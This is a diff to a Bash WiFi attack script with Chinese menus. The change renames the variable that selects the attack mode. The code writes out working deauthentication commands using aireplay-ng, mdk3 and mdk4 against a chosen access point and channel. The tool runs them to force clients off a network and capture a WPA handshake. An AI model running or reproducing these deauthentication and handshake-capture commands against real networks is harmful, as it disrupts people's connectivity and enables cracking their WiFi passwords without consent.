@@ -720,21 +720,21 @@ function exec_handshake_cuptrue() {
         
         #kai qi gon ji mdk xterm
         attack_pid=""
-        case "${attack_command}" in
-                "aireplay-ng")
+        case "${attack_mode}" in
+                "aireplay-ng_deauth")
                         iw dev "${wlan_card}" set channel "${cur_channel}" >/dev/null 2>&1
                         xterm -geometry "85+0+0" -bg "#000000" -fg "#FF0009" -title "Duan kai conn on ${mac_id}" -e "${attack_command}" -0 0 -a "${mac_id}" --ignore-negative-one "${wlan_card}" &
                         attack_pid=$!
                         sleep 2
                         ;;
-                "mdk3")
+                "mdk3_deauth")
                         echo  "${mac_id}" >"${work_dir}/black_mac_list.txt"
                         echo  "" >>"${work_dir}/black_mac_list.txt"
                         xterm -geometry "85+0+0" -bg "#000000" -fg "#FF0009" -title "Duan kai conn on ${mac_id}" -e "${attack_command}" "${wlan_card}" d -b "${work_dir}/black_mac_list.txt" -c "${cur_channel}" &
                         attack_pid=$!
                         sleep 2
                         ;;
-                "mdk4")
+                "mdk4_deauth")
                         echo  "${mac_id}" >"${work_dir}/black_mac_list.txt"
                         echo  "" >>"${work_dir}/black_mac_list.txt"
                         xterm -geometry "85+0+0" -bg "#000000" -fg "#FF0009" -title "Duan kai conn on ${mac_id}" -e "${attack_command}" "${wlan_card}" d -b "${work_dir}/black_mac_list.txt" -c "${cur_channel}" &
@@ -870,7 +870,7 @@ function start_exec_handshake() {
 
         local you_zl
         clear
-        echo -e "\033[35m当前网卡：\033[0m${wlan_card:-无}   \033[35m当前模式：\033[0m${attack_command:-无}   \033[35m扫描频段：\033[0m${attack_band:-无}"
+        echo -e "\033[35m当前网卡：\033[0m${wlan_card:-无}   \033[35m当前模式：\033[0m${attack_mode:-无}   \033[35m扫描频段：\033[0m${attack_band:-无}"
         echo -e "\033[36m--------------------------------------------------------------------\033[0m"
         echo -e "                             \033[36m抓包信息确认\033[0m                           "
         echo -e "\033[36m--------------------------------------------------------------------\033[0m"
@@ -907,7 +907,7 @@ function hack_menu() {
 
         local you_zl
         clear
-        echo -e "\033[35m当前网卡：\033[0m${wlan_card:-无}   \033[35m当前模式：\033[0m${attack_command:-无}   \033[35m扫描频段：\033[0m${attack_band:-无}"
+        echo -e "\033[35m当前网卡：\033[0m${wlan_card:-无}   \033[35m当前模式：\033[0m${attack_mode:-无}   \033[35m扫描频段：\033[0m${attack_band:-无}"
         echo -e "\033[36m--------------------------------------------------------------------\033[0m"
         echo -e "                             \033[36m频段选择菜单\033[0m                           "
         echo -e "\033[36m--------------------------------------------------------------------\033[0m"
@@ -1071,7 +1071,7 @@ function select_interface() {
 #######################################
 # 主菜单，功能模块的入口
 # Globals:
-#   ${attack_command}
+#   ${attack_command}、${attack_mode}
 # Arguments:
 #   none
 # Outputs:
@@ -1083,7 +1083,7 @@ function main_menu() {
 
         local you_zl
         clear
-        echo -e "\033[35m当前网卡：\033[0m${wlan_card:-无}   \033[35m当前模式：\033[0m${attack_command:-无}   \033[35m扫描频段：\033[0m${attack_band:-无}"
+        echo -e "\033[35m当前网卡：\033[0m${wlan_card:-无}   \033[35m当前模式：\033[0m${attack_mode:-无}   \033[35m扫描频段：\033[0m${attack_band:-无}"
         echo -e "\033[36m--------------------------------------------------------------------\033[0m"
         echo -e "                             \033[36m模式选择菜单\033[0m                           "
         echo -e "\033[36m--------------------------------------------------------------------\033[0m"
@@ -1101,14 +1101,17 @@ function main_menu() {
                         ;;
                 2)
                         attack_command="mdk3"
+                        attack_mode="mdk3_deauth"
                         hack_menu
                         ;;
                 3)
                         attack_command="mdk4"
+                        attack_mode="mdk4_deauth"
                         hack_menu
                         ;;
                 4)
                         attack_command="aireplay-ng"
+                        attack_mode="aireplay-ng_deauth"
                         hack_menu
                         ;;
                 *)
@@ -1151,7 +1154,7 @@ function main() {
 #######################################
 function print_process_msg() {
 
-        local message=$1
+        local message="$1"
         local cahr_1="${message}."
         local cahr_2="${message}.."
         local cahr_3="${message}..."
